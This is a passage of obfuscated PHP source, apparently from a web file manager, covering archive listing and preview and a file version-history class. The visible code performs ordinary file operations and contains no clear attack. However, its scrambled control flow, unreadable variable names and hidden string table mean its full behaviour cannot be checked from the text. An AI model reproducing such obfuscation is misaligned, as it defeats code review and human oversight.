del_dir($cÊÎÎÀ›áë); if (!$DÕ¨¶é¬·ß) { del_file($C†µ×èí®Ñ); } goto AšÕ õ’Ô„; AÌåŠ…Şë: $aÊ¢‚Ù°õŠ = self::tmpFileName($dó÷¶Áê‰ƒ); $cÊÎÎÀ›áë = TEMP_FILES . $aÊ¢‚Ù°õŠ; del_dir($cÊÎÎÀ›áë); goto fÀ˜ Ù’¤ë; fÀ˜ Ù’¤ë: mk_dir($cÊÎÎÀ›áë); $Dƒ­Ã´Š† = self::fileExt($dó÷¶Áê‰ƒ); $C†µ×èí®Ñ = $cÊÎÎÀ›áë . $A‰¦šò[105] . $Dƒ­Ã´Š†; goto dìíÏ»œ¿Ä; dìíÏ»œ¿Ä: if (!@file_exists(self::iconvSystem($C†µ×èí®Ñ))) { $DÕ¨¶é¬·ß = self::localFilePath($c±ÖÍ…, $Dƒ­Ã´Š†); $C†µ×èí®Ñ = $DÕ¨¶é¬·ß ? $DÕ¨¶é¬·ß : parent::download($c±ÖÍ…, $C†µ×èí®Ñ); } $C†µ×èí®Ñ = self::iconvSystem($C†µ×èí®Ñ); $AÙ…»Â¯…¢ = isset($cÖÔá‚¦Öé[$A‰¦šò[1106]]) ? $cÖÔá‚¦Öé[$A‰¦šò[1106]] : $A‰¦šò[1107]; goto FÛñöÈØ“¡; aßÅêÀ¡äŞ: Hook::trigger($A‰¦šò[1111], $cÊÎÎÀ›áë); recursion_dir($cÊÎÎÀ›áë, $e‡Ôº¥áÊ›, $få£©¿óó¥, 0); $eÎ“ó»ŠÄÀ = array_merge($e‡Ôº¥áÊ›, $få£©¿óó¥); goto F¿ö×Âòùè; EùÖÑ£ÂÎµ: } public static function unzipList($FÜŸÕƒå¤ã) { goto AÛÖ¢©šÅµ; b¶öî›î±¨: $D™®§Ãé² = 50000; if (request_url_safe($cëÙé¶œÅ)) { $DĞîš§ñÙ³ = parse_url_query($cëÙé¶œÅ); if (!isset($DĞîš§ñÙ³[$fÚ¼†„‚˜â[86]])) { show_json($fÚ¼†„‚˜â[1113], !1); } } $bÂ¸ö…»Ü¿ = isset($DĞîš§ñÙ³) ? $DĞîš§ñÙ³[$fÚ¼†„‚˜â[86]] : $cëÙé¶œÅ; goto aƒ åäÀŸ°; B“–ŸÁòÕà: self::archiveExt(); del_dir($F¹±ò‚òŞØ); if (!$E©ìÑÓÕ¤[$fÚ¼†„‚˜â[1108]]) { show_json($E©ìÑÓÕ¤[$fÚ¼†„‚˜â[1110]], !1); } goto e“Ì‚‘Ì¬; AÛÖ¢©šÅµ: $fÚ¼†„‚˜â =& $_SERVER[œÕÊİğö]; $cëÙé¶œÅ = $FÜŸÕƒå¤ã[$fÚ¼†„‚˜â[86]]; $b‚Íƒ÷Œ = isset($FÜŸÕƒå¤ã[$fÚ¼†„‚˜â[1112]]) ? $FÜŸÕƒå¤ã[$fÚ¼†„‚˜â[1112]] : -1; goto b¶öî›î±¨; b‹ÒĞÉà: if (!is_dir($F¹±ò‚òŞØ)) { mk_dir($F¹±ò‚òŞØ); } $c’Í†æ÷Õ˜ = $F¹±ò‚òŞØ . $fÚ¼†„‚˜â[8] . $d­‘‹ÆÙÎ­; if (!@file_exists(self::iconvSystem($c’Í†æ÷Õ˜))) { if (isset($DĞîš§ñÙ³)) { url_request($cëÙé¶œÅ, $fÚ¼†„‚˜â[1115], $c’Í†æ÷Õ˜); } else { $DƒÍƒù¨œº = self::localFilePath($cëÙé¶œÅ, $F“Æƒ•îáà); $c’Í†æ÷Õ˜ = $DƒÍƒù¨œº ? $DƒÍƒù¨œº : self::download($cëÙé¶œÅ, $c’Í†æ÷Õ˜); } } goto B¿áíà…; E¸Ş œ±˜: if (isset($DĞîš§ñÙ³)) { $D»ÎØÒ¹ùº = array($DĞîš§ñÙ³[$fÚ¼†„‚˜â[86]], $DĞîš§ñÙ³[$fÚ¼†„‚˜â[1112]], $DĞîš§ñÙ³[$fÚ¼†„‚˜â[38]]); $d­‘‹ÆÙÎ­ = md5(implode($fÚ¼†„‚˜â[81], $D»ÎØÒ¹ùº)) . $fÚ¼†„‚˜â[105] . get_path_ext($DĞîš§ñÙ³[$fÚ¼†„‚˜â[38]]); } else { $D»ÎØÒ¹ùº = array($BÈò…»µâß[$fÚ¼†„‚˜â[38]], $BÈò…»µâß[$fÚ¼†„‚˜â[86]], $BÈò…»µâß[$fÚ¼†„‚˜â[88]]); $d­‘‹ÆÙÎ­ = md5(implode($fÚ¼†„‚˜â[81], $D»ÎØÒ¹ùº)) . $fÚ¼†„‚˜â[105] . $F“Æƒ•îáà; } if ($b‚Íƒ÷Œ == -1) { $eŸå–à×‚ = IO_PATH_SYSTEM_TEMP . "\172\151\160\126\151\x65\x77\x2f{$CÁ¼¶¢«}\57{$d­‘‹ÆÙÎ­}\56\154\x6f\x67"; $DÓáö•š = self::infoFull($eŸå–à×‚); if ($DÓáö•š) { $eŸå–à×‚ = $DÓáö•š[$fÚ¼†„‚˜â[86]]; $Dğ¸ğÊÈç = self::getContent($eŸå–à×‚); if ($Dğ¸ğÊÈç) { $cÜÚòæ¼±« = json_decode($Dğ¸ğÊÈç, !0); if (count($cÜÚòæ¼±«) >= $D™®§Ãé²) { show_json(sprintf(LNG($fÚ¼†„‚˜â[1114]), count($cÜÚòæ¼±«)), !1); } return $cÜÚòæ¼±«; } } else { $eŸå–à×‚ = self::mkfile($eŸå–à×‚); } } $F¹±ò‚òŞØ = TEMP_FILES . $CÁ¼¶¢«; goto b‹ÒĞÉà; cÎ¡Şìí¶: return $E©ìÑÓÕ¤[$fÚ¼†„‚˜â[1110]]; goto BÔô¿ù¡è; e“Ì‚‘Ì¬: $cÜÚòæ¼±« = json_encode($E©ìÑÓÕ¤[$fÚ¼†„‚˜â[1110]]); self::setContent($eŸå–à×‚, $cÜÚòæ¼±«); if (count($E©ìÑÓÕ¤[$fÚ¼†„‚˜â[1110]]) >= $D™®§Ãé²) { show_json(sprintf(LNG($fÚ¼†„‚˜â[1114]), count($E©ìÑÓÕ¤[$fÚ¼†„‚˜â[1110]])), !1); } goto cÎ¡Şìí¶; aƒ åäÀŸ°: $BÈò…»µâß = self::info($bÂ¸ö…»Ü¿); $F“Æƒ•îáà = self::fileExt($BÈò…»µâß); $CÁ¼¶¢« = self::tmpFileName($BÈò…»µâß); goto E¸Ş œ±˜; B¿áíà…: $c’Í†æ÷Õ˜ = self::iconvSystem($c’Í†æ÷Õ˜); if ($b‚Íƒ÷Œ >= 0) { $f°¢ŠŸÚ¢ = isset($FÜŸÕƒå¤ã[$fÚ¼†„‚˜â[1116]]) ? $FÜŸÕƒå¤ã[$fÚ¼†„‚˜â[1116]] : !1; $E…ÇÈ‚Æô = isset($FÜŸÕƒå¤ã[$fÚ¼†„‚˜â[38]]) ? $FÜŸÕƒå¤ã[$fÚ¼†„‚˜â[38]] : $fÚ¼†„‚˜â[43]; KodArchive::filePreview($c’Í†æ÷Õ˜, $b‚Íƒ÷Œ, $f°¢ŠŸÚ¢, $E…ÇÈ‚Æô); self::archiveExt(); die; } $E©ìÑÓÕ¤ = KodArchive::listContent($c’Í†æ÷Õ˜); goto B“–ŸÁòÕà; BÔô¿ù¡è: } private static function fileExt($EïËìšçË) { $Cõ—¿ Š— =& $_SERVER[œÕÊİğö]; $A°Ÿó‰ï± = $EïËìšçË[$Cõ—¿ Š—[178]]; if ($A°Ÿó‰ï± == $Cõ—¿ Š—[1117]) { $E¾Ê×ÑÕ® = $Cõ—¿ Š—[1118]; if (substr($EïËìšçË[$Cõ—¿ Š—[38]], -strlen($E¾Ê×ÑÕ®)) == $E¾Ê×ÑÕ®) { $A°Ÿó‰ï± = $Cõ—¿ Š—[1119]; } } self::archiveExt($A°Ÿó‰ï±); return $A°Ÿó‰ï±; } private static function zipFileList($EóØ’»îŒî, $eİ¥õ‡¼ç = false) { $a ÎªŸˆÅ =& $_SERVER[œÕÊİğö]; $aÎˆ‘ËºæŞ = array(); foreach ($EóØ’»îŒî as $fÜÏÛéÌ»‘) { $BæÜ£²Ã„Œ = $fÜÏÛéÌ»‘[$a ÎªŸˆÅ[86]]; if ($eİ¥õ‡¼ç) { $BæÜ£²Ã„Œ = self::copy($fÜÏÛéÌ»‘[$a ÎªŸˆÅ[86]], $eİ¥õ‡¼ç, $a ÎªŸˆÅ[815]); } else { $FœÍé…ºÃè = self::init($fÜÏÛéÌ»‘[$a ÎªŸˆÅ[86]]); if ($FœÍé…ºÃè->getType() == $a ÎªŸˆÅ[116]) { $BæÜ£²Ã„Œ = $FœÍé…ºÃè->path; } } if ($BæÜ£²Ã„Œ && self::local()->exist($BæÜ£²Ã„Œ)) { $aÎˆ‘ËºæŞ[$fÜÏÛéÌ»‘[$a ÎªŸˆÅ[86]]] = $BæÜ£²Ã„Œ; } } if (!empty($aÎˆ‘ËºæŞ)) { return array_values($aÎˆ‘ËºæŞ); } show_json(LNG($a ÎªŸˆÅ[1083]), !1); } public static function tmpFileName($eÛÀ¥œ´ßä) { $aŞì¿šÕ ” =& $_SERVER[œÕÊİğö]; $a‰ôˆ²½Ë = array($eÛÀ¥œ´ßä[$aŞì¿šÕ ”[38]], $eÛÀ¥œ´ßä[$aŞì¿šÕ ”[86]], $eÛÀ¥œ´ßä[$aŞì¿šÕ ”[88]], $eÛÀ¥œ´ßä[$aŞì¿šÕ ”[524]]); return md5(implode($aŞì¿šÕ ”[81], $a‰ôˆ²½Ë)); } private static function localFilePath($E®ºá¾Ğ¯Ş, $FÛÙŸî™—¢) { goto có¶İ‰ÙŠ; E‚¸À“ÇØ•: if ($c—­‚É˜‘½ == $bâš¼›­‰Â[116] || $c—­‚É˜‘½ == $bâš¼›­‰Â[1123]) { if (!$cÁ‘ŠßÜ¥Ã->exist($cÁ‘ŠßÜ¥Ã->path)) { show_json(LNG($bâš¼›­‰Â[115]), !1); } return $cÁ‘ŠßÜ¥Ã->path; } return !1; goto dÎª¸ø§œ; f†ä¹¯¨: if ($fî‘¡æ®ö[$bâš¼›­‰Â[39]] == KodIO::KOD_SOURCE) { $c¾ÄŞ¹æ‚œ = Model($bâš¼›­‰Â[822])->fileInfoGet(KodIO::sourceID($E®ºá¾Ğ¯Ş)); if (!$c¾ÄŞ¹æ‚œ[$bâš¼›­‰Â[86]]) { show_json($bâš¼›­‰Â[1122], !1); } $E®ºá¾Ğ¯Ş = $c¾ÄŞ¹æ‚œ[$bâš¼›­‰Â[86]]; } $cÁ‘ŠßÜ¥Ã = self::init($E®ºá¾Ğ¯Ş); $c—­‚É˜‘½ = $cÁ‘ŠßÜ¥Ã->getType(); goto E‚¸À“ÇØ•; có¶İ‰ÙŠ: $bâš¼›­‰Â =& $_SERVER[œÕÊİğö]; if ($FÛÙŸî™—¢ == $bâš¼›­‰Â[1120] && strtoupper(substr(PHP_OS, 0, 3)) == $bâš¼›­‰Â[1121]) { return !1; } $fî‘¡æ®ö = KodIO::parse($E®ºá¾Ğ¯Ş); goto f†ä¹¯¨; dÎª¸ø§œ: } private static function archiveExt($eò‡‡¥çî¢ = '') { $GLOBALS[$_SERVER[œÕÊİğö][1124]] = $eò‡‡¥çî¢; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto eÈ°¼ÌèÚ§; eÈ°¼ÌèÚ§: $dÅÍ±Íìàğ =& $_SERVER[œÕÊİğö]; $B¤¤°¨ğîâ = $GLOBALS[$dÅÍ±Íìàğ[6]][$dÅÍ±Íìàğ[98]]; if ($B¤¤°¨ğîâ[$dÅÍ±Íìàğ[1125]] != 1) { return; } goto Aëõé“•µ; Aëõé“•µ: if ($B¤¤°¨ğîâ[$dÅÍ±Íìàğ[1126]] <= 0) { return; } if (isset($_REQUEST[$dÅÍ±Íìàğ[1127]]) && $_REQUEST[$dÅÍ±Íìàğ[1127]] == $dÅÍ±Íìàğ[97]) { return; } Hook::bind($dÅÍ±Íìàğ[1128], $dÅÍ±Íìàğ[1129]); goto A‡Ä•ÚÄ™¸; D‹Í‘½¼æ: Hook::bind($dÅÍ±Íìàğ[1136], $dÅÍ±Íìàğ[1137]); Hook::bind($dÅÍ±Íìàğ[1138], $dÅÍ±Íìàğ[1139]); goto bê¾ÀˆØé¦; A‡Ä•ÚÄ™¸: Hook::bind($dÅÍ±Íìàğ[1130], $dÅÍ±Íìàğ[1131]); Hook::bind($dÅÍ±Íìàğ[1132], $dÅÍ±Íìàğ[1133]); Hook::bind($dÅÍ±Íìàğ[1134], $dÅÍ±Íìàğ[1135]); goto D‹Í‘½¼æ; bê¾ÀˆØé¦: } public static function eventBeforeUpload($Aò“¢¢ÔÜ™) { if ($Aò“¢¢ÔÜ™[3] && $Aò“¢¢ÔÜ™[3] != REPEAT_REPLACE) { return; } $dŞ¡ÏØ…¬¨ = self::parsePath($Aò“¢¢ÔÜ™[0]); if (!$dŞ¡ÏØ…¬¨) { return; } self::add($dŞ¡ÏØ…¬¨); } public static function eventBeforeEdit($e‹ç÷ Ãöá) { $c§®ƒÆÏö = self::parsePath($e‹ç÷ Ãöá[0]); if (!$c§®ƒÆÏö) { return; } self::add($c§®ƒÆÏö); } public static function eventBeforeCopyFile($e›¹‡Ò‹ˆ, $FÛ±ßÙ‹Îá, $eÉø†ªœˆì, $BŸ›æŠ¹æš, $AËËæÉĞ…×, $dİò°‚óì†) { $aã¾¬‘‘¤ = $eÉø†ªœˆì->getPathOuter($BŸ›æŠ¹æš); $E¡Ò½š«ï« = self::parsePath($aã¾¬‘‘¤); if (!$E¡Ò½š«ï«) { return; } self::add($E¡Ò½š«ï«); } public static function eventBeforeRename($E®òç¤œÃñ) { $Aáñä‚ãùŠ =& $_SERVER[œÕÊİğö]; $f¸¥Ã×¼ß· = self::parsePath($E®òç¤œÃñ[0]); if (!$f¸¥Ã×¼ß·) { return; } $cÑ‘¿š×Ñ = self::checkInHistory($f¸¥Ã×¼ß·); if (!$cÑ‘¿š×Ñ) { return; } if ($cÑ‘¿š×Ñ[$Aáñä‚ãùŠ[39]] == $Aáñä‚ãùŠ[203]) { $f‚ò±äŸÓ… = self::listData($f¸¥Ã×¼ß·); if ($f‚ò±äŸÓ… && $f‚ò±äŸÓ…[$Aáñä‚ãùŠ[377]]) { self::moveHistory($f¸¥Ã×¼ß·, $E®òç¤œÃñ[1]); } } else { IO::rename($cÑ‘¿š×Ñ[$Aáñä‚ãùŠ[86]], $E®òç¤œÃñ[1]); } } public static function eventBeforeMove($Aº©öÂ††) { goto aŸ¬ßÒÉˆ; cƒİŒ‚åöË: $d÷”ªä£ö = self::parsePath($Aº©öÂ††[1]); if (!$d÷”ªä£ö) { return; } $a×ÔÅİé«— = $Aº©öÂ††[3]; goto B¾˜”÷„‰; aŸ¬ßÒÉˆ: $dçÛ£ÙöÚà =& $_SERVER[œÕÊİğö]; $e¬…Ò²ñò¡ = self::parsePath($Aº©öÂ††[0]); if (!$e¬…Ò²ñò¡) { return; } goto cƒİŒ‚åöË; B¾˜”÷„‰: $fóÆæî = self::checkInHistory($e¬…Ò²ñò¡); if (!$fóÆæî) { return; } $AñÓô¼š­Ø = self::pathHistory($d÷”ªä£ö); goto FÖùÌğ¤è–; FÖùÌğ¤è–: if ($fóÆæî[$dçÛ£ÙöÚà[39]] == $dçÛ£ÙöÚà[203]) { $BÂ–·•³…Ò = self::listData($e¬…Ò²ñò¡); $eêã‰™‚¾„ = rtrim($d÷”ªä£ö, $dçÛ£ÙöÚà[8]) . $dçÛ£ÙöÚà[8] . ($a×ÔÅİé«— ? $a×ÔÅİé«— : get_path_this($e¬…Ò²ñò¡)); $A¨•à©—”ë = self::listData($eêã‰™‚¾„); if ($BÂ–·•³…Ò && $BÂ–·•³…Ò[$dçÛ£ÙöÚà[377]] && $A¨•à©—”ë && $A¨•à©—”ë[$dçÛ£ÙöÚà[377]]) { return self::clear($e¬…Ò²ñò¡); } if ($BÂ–·•³…Ò && $BÂ–·•³…Ò[$dçÛ£ÙöÚà[377]]) { self::moveHistory($e¬…Ò²ñò¡, $a×ÔÅİé«—, $AñÓô¼š­Ø); } } else { IO::move($fóÆæî[$dçÛ£ÙöÚà[86]], $AñÓô¼š­Ø, !1, $a×ÔÅİé«—); self::clearEmptyFolder(IO::pathFather($fóÆæî[$dçÛ£ÙöÚà[86]])); } goto A­‡İ¯“˜; A­‡İ¯“˜: } public static function eventAfterRemove($cÇñ÷‹Œíí, $aŒœÃİ‹‰Â) { goto BÕ‹²Œ‹â; BÕ‹²Œ‹â: $cá·œ²Ú†Ò =& $_SERVER[œÕÊİğö]; if (!$aŒœÃİ‹‰Â) { return; } $EôÇóÇŸĞ¶ = self::parsePath($cÇñ÷‹Œíí[0]); goto e˜Ó»¨•íÛ; bÖ±ÂáÃˆ: if ($Eôì‡Û¾‘[$cá·œ²Ú†Ò[39]] == $cá·œ²Ú†Ò[203]) { $C–Õ¾†ÜÛ• = self::listData($EôÇóÇŸĞ¶, !1); if ($C–Õ¾†ÜÛ• && $C–Õ¾†ÜÛ•[$cá·œ²Ú†Ò[377]]) { self::clear($EôÇóÇŸĞ¶, !1); } } else { IO::remove($Eôì‡Û¾‘[$cá·œ²Ú†Ò[86]]); self::clearEmptyFolder(IO::pathFather($Eôì‡Û¾‘[$cá·œ²Ú†Ò[86]])); } goto C³„Ö¿ÉŸ; e˜Ó»¨•íÛ: if (!$EôÇóÇŸĞ¶) { return; } $Eôì‡Û¾‘ = self::checkInHistory($EôÇóÇŸĞ¶); if (!$Eôì‡Û¾‘) { return; } goto bÖ±ÂáÃˆ; C³„Ö¿ÉŸ: } private static function checkInHistory($Fã§‰›Á±Ÿ) { $AàÕó˜ì¢ = self::pathHistory($Fã§‰›Á±Ÿ); if (!IO::exist($AàÕó˜ì¢)) { $AàÕó˜ì¢ .= $_SERVER[œÕÊİğö][1140]; } return IO::exist($AàÕó˜ì¢) ? IO::info($AàÕó˜ì¢) : !1; } private static function parsePath($FßƒíÀ·…ä) { goto c®”Œèí‘Ï; FÛÜ¼‚®Ã°: self::log($GLOBALS[$eİ’ñáâš…[1065]] . $eİ’ñáâš…[1145] . $FßƒíÀ·…ä); return $FßƒíÀ·…ä; goto f®ÄŒï‚„; c®”Œèí‘Ï: $eİ’ñáâš… =& $_SERVER[œÕÊİğö]; if (!$FßƒíÀ·…ä) { return !1; } if ($GLOBALS[$eİ’ñáâš…[1141]]) { return; } goto D´… ÏÖ®; D´… ÏÖ®: $CÄğäÏ•­ = KodIO::parse($FßƒíÀ·…ä); $CâÕ†¯¼Ÿ  = $CÄğäÏ•­[$eİ’ñáâš…[39]]; $bïÛòŸæì = !$CâÕ†¯¼Ÿ  || $CâÕ†¯¼Ÿ  == KodIO::KOD_IO || $CâÕ†¯¼Ÿ  == KodIO::KOD_SHARE_ITEM; goto fˆÕ²èïŠÒ; fˆÕ²èïŠÒ: if (!$bïÛòŸæì || !$CÄğäÏ•­[$eİ’ñáâš…[1142]]) { return !1; } if (substr($FßƒíÀ·…ä, 0, strlen(DATA_PATH . $eİ’ñáâš…[1143])) == DATA_PATH . $eİ’ñáâš…[1143]) { return !1; } if ($CâÕ†¯¼Ÿ  == KodIO::KOD_SHARE_ITEM) { $E­Ô‘¸ùÂ± = IO::init($FßƒíÀ·…ä); if ($E­Ô‘¸ùÂ±->pathParse[$eİ’ñáâš…[1070]]) { return self::parsePath($E­Ô‘¸ùÂ±->pathParse[$eİ’ñáâš…[1070]]); } return !1; } goto cÊ”‰ç»Î; cÊ”‰ç»Î: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $b„­èçŞ’î = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $eİ’ñáâš…[1144]); foreach ($b„­èçŞ’î as $a¼ìÉÙª’) { if (!$CâÕ†¯¼Ÿ  && substr($FßƒíÀ·…ä, 0, strlen($a¼ìÉÙª’)) == $a¼ìÉÙª’) { return !1; } } goto FÛÜ¼‚®Ã°; f®ÄŒï‚„: } private static function pathHistory($F°¦Æ“Æœ‘) { $d¥³š¦éêÙ =& $_SERVER[œÕÊİğö]; $aø¿Ì¤¡“ = self::$_historyBase . ltrim(KodIO::clear($F°¦Æ“Æœ‘), $d¥³š¦éêÙ[8]); $aø¿Ì¤¡“ = str_replace(array($d¥³š¦éêÙ[1146]), array($d¥³š¦éêÙ[1147]), $aø¿Ì¤¡“); return $aø¿Ì¤¡“; } public static function log($fŸŸ·£é¡) { } public static function historyCount($f­°àãšÑ) { $aÈÊàª«²Ê =& $_SERVER[œÕÊİğö]; $cŞÄ·ÚÑÙŠ = array(); $D–…ëÖğŸ  = array(); foreach ($f­°àãšÑ as $E‚‡Â¾”‘²) { $aŸà«× ŸÂ = get_path_father($E‚‡Â¾”‘²); if (!$D–…ëÖğŸ [$aŸà«× ŸÂ]) { $D–…ëÖğŸ [$aŸà«× ŸÂ] = array(); } $D–…ëÖğŸ [$aŸà«× ŸÂ][] = get_path_this($E‚‡Â¾”‘²); } foreach ($D–…ëÖğŸ  as $aŸà«× ŸÂ => $fƒ×ÒìÒÁ÷) { $Fîš‚ÓØ¹ = self::parsePath($aŸà«× ŸÂ); if (!$Fîš‚ÓØ¹) { continue; } foreach ($fƒ×ÒìÒÁ÷ as $CğºšÃÏŒµ) { $Aßãš‚Ìíø = self::listData(rtrim($Fîš‚ÓØ¹, $aÈÊàª«²Ê[8]) . $aÈÊàª«²Ê[8] . $CğºšÃÏŒµ, !1); if ($Aßãš‚Ìíø && $Aßãš‚Ìíø[$aÈÊàª«²Ê[377]]) { $cŞÄ·ÚÑÙŠ[rtrim($aŸà«× ŸÂ, $aÈÊàª«²Ê[8]) . $aÈÊàª«²Ê[8] . $CğºšÃÏŒµ] = count($Aßãš‚Ìíø[$aÈÊàª«²Ê[377]]); } } } return $cŞÄ·ÚÑÙŠ; } public static function add($eÊğä‰ëÒ) { goto e¥Â÷ßÖØõ; BÖ‚ÜŒø”¹: $döÎİ‘‚’Ì = $d×ÌƒŞÊƒ[$e˜ŒîÊæËÏ[377]]; if ($AÙÉÎÃÊ¾[$e˜ŒîÊæËÏ[88]] == 0) { return; } if ($AÙÉÎÃÊ¾[$e˜ŒîÊæËÏ[88]] >= 1024 * 1024 * 500) { return !1; } goto EÚÍä±µª·; B°ÁÒ¬ö: $C¤¥£Æ…µ£ = array($e˜ŒîÊæËÏ[404] => $d÷÷¥äÔ·œ, $e˜ŒîÊæËÏ[181] => $B¹õ·»Ë‡, $e˜ŒîÊæËÏ[38] => $AÙÉÎÃÊ¾[$e˜ŒîÊæËÏ[38]] . $e˜ŒîÊæËÏ[105] . date($e˜ŒîÊæËÏ[1150]) . rand_string(1), $e˜ŒîÊæËÏ[88] => $AÙÉÎÃÊ¾[$e˜ŒîÊæËÏ[88]], $e˜ŒîÊæËÏ[455] => USER_ID, $e˜ŒîÊæËÏ[204] => time(), $e˜ŒîÊæËÏ[1151] => $e˜ŒîÊæËÏ[43]); IO::mkdir($d×ÌƒŞÊƒ[$e˜ŒîÊæËÏ[1152]]); $cö–½Òã¸¾ = IO::copy($eÊğä‰ëÒ, $d×ÌƒŞÊƒ[$e˜ŒîÊæËÏ[1152]], !1, $C¤¥£Æ…µ£[$e˜ŒîÊæËÏ[38]]); goto C¾ñ×³â‘µ; EÚÍä±µª·: if ($döÎİ‘‚’Ì && $döÎİ‘‚’Ì[0][$e˜ŒîÊæËÏ[181]] == $B¹õ·»Ë‡) { return !0; } if (array_key_exists($e˜ŒîÊæËÏ[206], $AÙÉÎÃÊ¾) && !$AÙÉÎÃÊ¾[$e˜ŒîÊæËÏ[206]]) { return !1; } $d÷÷¥äÔ·œ = short_id(time()); goto B°ÁÒ¬ö; b„ÔÁÔù„: return self::saveData($d×ÌƒŞÊƒ[$e˜ŒîÊæËÏ[1153]], $döÎİ‘‚’Ì); goto f·¼ˆ„éŒ; C¾ñ×³â‘µ: if (!$cö–½Òã¸¾) { self::clearEmptyFolder($d×ÌƒŞÊƒ[$e˜ŒîÊæËÏ[1152]]); return !1; } array_unshift($döÎİ‘‚’Ì, $C¤¥£Æ…µ£); if (count($döÎİ‘‚’Ì) > $A¡ƒ‚…ÓÏª) { $F´¨»Ü…µÑ = array_slice($döÎİ‘‚’Ì, $A¡ƒ‚…ÓÏª); foreach ($F´¨»Ü…µÑ as $CÊ£„“±ò¸) { IO::remove($d×ÌƒŞÊƒ[$e˜ŒîÊæËÏ[1152]] . $CÊ£„“±ò¸[$e˜ŒîÊæËÏ[38]]); } $döÎİ‘‚’Ì = array_slice($döÎİ‘‚’Ì, 0, $A¡ƒ‚…ÓÏª); } goto b„ÔÁÔù„; e¥Â÷ßÖØõ: $e˜ŒîÊæËÏ =& $_SERVER[œÕÊİğö]; $d×ÌƒŞÊƒ = self::listData($eÊğä‰ëÒ); if (!$d×ÌƒŞÊƒ) { return; } goto C¶Æ÷ŞËÂó; dÇ¼ºÙà‹×: if ($eê‰´…Õ <= 0) { return; } $B¹õ·»Ë‡ = IO::hashSimple($eÊğä‰ëÒ); $AÙÉÎÃÊ¾ = IO::info($eÊğä‰ëÒ); goto BÖ‚ÜŒø”¹; C¶Æ÷ŞËÂó: $c¸»ŒÚÔæˆ = Model($e˜ŒîÊæËÏ[760])->get($e˜ŒîÊæËÏ[1148]); $eê‰´…Õ = $GLOBALS[$e˜ŒîÊæËÏ[6]][$e˜ŒîÊæËÏ[98]][$e˜ŒîÊæËÏ[1126]]; $A¡ƒ‚…ÓÏª = $c¸»ŒÚÔæˆ == $e˜ŒîÊæËÏ[1149] ? 5 : $eê‰´…Õ; goto dÇ¼ºÙà‹×; f·¼ˆ„éŒ: } public static function remove($C„ÚòöÙˆ, $aáÕ©İÅ) { $D…‘öğåÔŸ =& $_SERVER[œÕÊİğö]; $EÑ“»©‡İ = self::listData($C„ÚòöÙˆ); $DéöëåœùŒ = array(); if (!$EÑ“»©‡İ) { return !1; } foreach ($EÑ“»©‡İ[$D…‘öğåÔŸ[377]] as $E ™—ã½) { if ($E ™—ã½[$D…‘öğåÔŸ[404]] == $aáÕ©İÅ) { IO::remove($EÑ“»©‡İ[$D…‘öğåÔŸ[1152]] . $E ™—ã½[$D…‘öğåÔŸ[38]]); continue; } $DéöëåœùŒ[] = $E ™—ã½; } return self::saveData($EÑ“»©‡İ[$D…‘öğåÔŸ[1153]], $DéöëåœùŒ); } public static function clear($f­Ü ËŒÑÔ, $D©Á˜†ì– = true) { $bê‰¯•‘ƒ =& $_SERVER[œÕÊİğö]; $fÖ·ØÁö = self::listData($f­Ü ËŒÑÔ, $D©Á˜†ì–); if (!$fÖ·ØÁö) { return !1; } foreach ($fÖ·ØÁö[$bê‰¯•‘ƒ[377]] as $Dè„÷ÏÁˆ•) { IO::remove($fÖ·ØÁö[$bê‰¯•‘ƒ[1152]] . $Dè„÷ÏÁˆ•[$bê‰¯•‘ƒ[38]]); } return self::saveData($fÖ·ØÁö[$bê‰¯•‘ƒ[1153]], array()); } public static function moveHistory($DÁÌù÷¡¯õ, $A‹Š²îˆ„ = '', $AËŠùÒ = '') { goto AëâË‹Âòç; AëâË‹Âòç: $fÒã–§ë =& $_SERVER[œÕÊİğö]; $fŠ†…¡§Á = self::listData($DÁÌù÷¡¯õ, !1); if (!$fŠ†…¡§Á || !$fŠ†…¡§Á[$fÒã–§ë[377]]) { return !1; } goto Fæ™ù…‹…•; aå§ëŠÙéµ: $FÓ·ÖÀŠŸÜ = substr(get_path_this($fŠ†…¡§Á[$fÒã–§ë[1153]]), 0, -strlen($eÎ…Ì–¾¯)); foreach ($fŠ†…¡§Á[$fÒã–§ë[377]] as $d¡öæøØÏ® => $F§íğİÏº¹) { $D¥Î™Âğ— = $A‹Š²îˆ„ . substr($F§íğİÏº¹[$fÒã–§ë[38]], strlen($FÓ·ÖÀŠŸÜ)); $b‹ÕÓé‰¤° = IO::move($fŠ†…¡§Á[$fÒã–§ë[1152]] . $F§íğİÏº¹[$fÒã–§ë[38]], $AËŠùÒ, !1, $D¥Î™Âğ—); if ($b‹ÕÓé‰¤°) { $fŠ†…¡§Á[$fÒã–§ë[377]][$d¡öæøØÏ®][$fÒã–§ë[38]] = $D¥Î™Âğ—; } } $fŠ†…¡§Á[$fÒã–§ë[1153]] = IO::move($fŠ†…¡§Á[$fÒã–§ë[1153]], $AËŠùÒ, !1, $A‹Š²îˆ„ . $eÎ…Ì–¾¯); goto e•çô²ÀË; e•çô²ÀË: self::saveData($fŠ†…¡§Á[$fÒã–§ë[1153]], $fŠ†…¡§Á[$fÒã–§ë[377]]); self::clearEmptyFolder($fŠ†…¡§Á[$fÒã–§ë[1152]]); goto BÄŒ›ÜÈÒ; Fæ™ù…‹…•: $eÎ…Ì–¾¯ = $fÒã–§ë[1140]; $A‹Š²îˆ„ = $A‹Š²îˆ„ ? $A‹Š²îˆ„ : get_path_this($DÁÌù÷¡¯õ); $AËŠùÒ = $AËŠùÒ ? $AËŠùÒ : $fŠ†…¡§Á[$fÒã–§ë[1152]]; goto aå§ëŠÙéµ; BÄŒ›ÜÈÒ: } public static function rollback($dæ‰š¦Ïí, $dæ¥†ğÙ×ƒ) { $AˆÈ®öÓµ =& $_SERVER[œÕÊİğö]; $c‰‡¬»Ï˜ƒ = self::listData($dæ‰š¦Ïí); if (!$c‰‡¬»Ï˜ƒ) { return; } $CÖˆ´ÀŒ„… = IO::info($dæ‰š¦Ïí); foreach ($c‰‡¬»Ï˜ƒ[$AˆÈ®öÓµ[377]] as $b¸Ô‰…˜¨ => $fÆñï‚îÇ) { if ($fÆñï‚îÇ[$AˆÈ®öÓµ[404]] == $dæ¥†ğÙ×ƒ) { self::add($dæ‰š¦Ïí); $Bí¥ŒøËŠ« = $c‰‡¬»Ï˜ƒ[$AˆÈ®öÓµ[1152]] . $fÆñï‚îÇ[$AˆÈ®öÓµ[38]]; $F°ÇÊ½†ç† = 